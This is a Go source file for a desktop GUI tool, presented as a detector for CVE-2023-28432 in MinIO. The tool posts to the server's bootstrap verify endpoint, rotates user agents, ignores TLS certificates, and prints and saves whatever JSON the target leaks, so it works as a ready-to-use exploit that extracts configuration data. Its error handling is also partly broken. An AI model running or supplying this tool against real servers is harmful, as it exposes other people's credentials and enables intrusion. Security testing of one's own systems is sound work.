package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
	"github.com/flopp/go-findfont"
	"github.com/goki/freetype/truetype"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"time"
)

func getRandomUserAgent() string {
	rand.Seed(time.Now().UnixNano())
	return UserAgents[rand.Intn(len(UserAgents))]
}

var UserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	// 可以继续添加更多的 User-Agent
}

func init() {
	fontPath, err := findfont.Find("simkai.ttf")
	if err != nil {
		panic(err)
	}
	fmt.Printf("Found 'simkai.ttf' in '%s'\n", fontPath)

	// load the font with the freetype library
	// 原作者使用的ioutil.ReadFile已经弃用
	fontData, err := os.ReadFile(fontPath)
	if err != nil {
		panic(err)
	}
	_, err = truetype.Parse(fontData)
	if err != nil {
		panic(err)
	}
	os.Setenv("FYNE_FONT", fontPath)
}
func main() {
	// 创建新应用
	myApp := app.New()
	myWindow := myApp.NewWindow("CVE-2023-28432 Vulnerability Detector")
	myWindow.Resize(fyne.NewSize(800, 600))
	// 创建用户输入字段、按钮和输出显示区域
	input := widget.NewEntry()
	input.SetPlaceHolder("Enter target URL or IP")
	output := widget.NewMultiLineEntry()
	scrollOutput := container.NewVScroll(output)
	scrollOutput.SetMinSize(fyne.NewSize(800, 400))
	checkButton := widget.NewButton("Check Vulnerability", func() {
		// 获取输入值
		target := input.Text

		// 检查输入值是否为空
		if target == "" {
			output.SetText("Error: Input is empty. Please enter a target URL or IP.\n")
			return
		}

		// 检查输入值是否是有效的URL
		_, err := url.ParseRequestURI(target)
		if err != nil {
			output.SetText(fmt.Sprintf("Error: Invalid URL or IP. Please enter a valid target URL or IP.\nError details: %s\n", err))
			return
		}

		// 既然输入有效，继续检查漏洞
		output.SetText("Checking: " + target + "\n")
		result := checkVulnerability(target)
		output.SetText(output.Text + result + "\n")
	})
	saveButton := widget.NewButton("Save Result", func() {
		// 从 output 获取文本
		jsonData := []byte(output.Text)

		// 创建一个文件保存对话框
		saveFileDialog := dialog.NewFileSave(
			func(writeCloser fyne.URIWriteCloser, err error) {
				// 用户取消操作
				if writeCloser == nil {
					return
				}
				if err != nil {
					dialog.ShowError(err, myWindow)
					return
				}

				_, err = writeCloser.Write(jsonData)
				if err != nil {
					dialog.ShowError(err, myWindow)
					return
				}
				err = writeCloser.Close()
				if err != nil {
					dialog.ShowError(err, myWindow)
					return
				}
				dialog.ShowInformation("Success", "File saved successfully", myWindow)
			}, myWindow)
		saveFileDialog.Resize(fyne.NewSize(800, 800))
		// 设置对话框的初始目录和文件名
		saveFileDialog.SetFileName("result.json")
		saveFileDialog.SetFilter(storage.NewExtensionFileFilter([]string{".json"}))
		// 显示文件保存对话框
		saveFileDialog.Show()
	})

	// 将组件放入容器
	content := container.NewBorder(container.NewVBox(input, checkButton), saveButton, nil, nil, scrollOutput) // 添加输出显示区域到容器
	myWindow.SetContent(content)

	// 运行应用
	myWindow.ShowAndRun()
}

// checkVulnerability 是检测CVE-2023-28432漏洞的函数，这里需要根据实际情况编写逻辑。
func checkVulnerability(target string) string {
	parsedURL, err := url.Parse(target)
	url := parsedURL.Scheme + "://" + parsedURL.Host + "/minio/bootstrap/v1/verify"
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		fmt.Println("Error creating request: ", err)
	}
	req.Header.Set("User-Agent", getRandomUserAgent())
	client := &http.Client{
		Transport: &http.Transport{
			// 自定义TLS客户端配置
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // 设置为true来忽略证书验证
			},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request: ", err)
	}
	defer resp.Body.Close()
	// 这里应该是针对CVE-2023-28432的检测代码
	// 返回值应该是检测结果的描述
	// 以下仅为示例逻辑，实际应根据漏洞特点和检测方法进行编写
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// 处理错误
	}
	// 将字节转换为字符串
	bodyString := string(bodyBytes)
	if resp.StatusCode == 200 {
		var data interface{}
		err = json.Unmarshal([]byte(bodyString), &data)
		if err != nil {
			log.Fatalf("Error occurred during unmarshaling. Error: %s", err.Error())
		}

		// 美化 JSON 字符串
		indentedJSON, err := json.MarshalIndent(data, "", "    ")
		if err != nil {
			log.Fatalf("Error occurred during marshaling. Error: %s", err.Error())
		}

		// 输出美化后的 JSON 字符串
		return "Target is vulnerable to CVE-2023-28432!" + "\n" + string(indentedJSON)
	}
	return "Target is not vulnerable to CVE-2023-28432."
}

func saveResult(jsonData []byte) error {
	// 使用 os.OpenFile 打开文件，如果文件不存在则创建，权限设置为 0644
	file, err := os.OpenFile("result.txt", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	// 将 JSON 数据写入文件
	_, err = file.Write(jsonData)
	if err != nil {
		return err
	}

	return nil
}
